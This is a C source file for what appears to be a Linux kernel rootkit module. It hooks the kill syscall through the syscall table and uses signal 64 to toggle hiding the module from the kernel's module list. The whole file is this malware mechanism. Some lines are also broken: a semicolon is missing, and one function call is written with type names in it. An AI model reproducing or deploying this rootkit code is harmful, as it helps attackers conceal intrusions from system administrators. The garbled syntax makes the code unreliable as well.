#include <hook_kill.h>
#include <table.h>
#include <linux/list.h>

static short hide = 0
static struct list_head *prev_module;

void start_hide(){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void stop_hide(){
    list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage long hook_kill(pid_t pid, int sig){
    if (sig == 64 && !hide){
        start_hide();
        hide = 1;
    } else if (sig == 64 && hide)
    {
        stop_hide();
        hide = 0;
    }
    return orig_kill(pid_t pid, int sig);
}

void init_kill_hook(){
    orig_kill = *syscall_table_kill; 
    *syscall_table_kill = hook_kill;
}

void remove_kill_hook(){
    *syscall_table_kill = orig_kill;
}
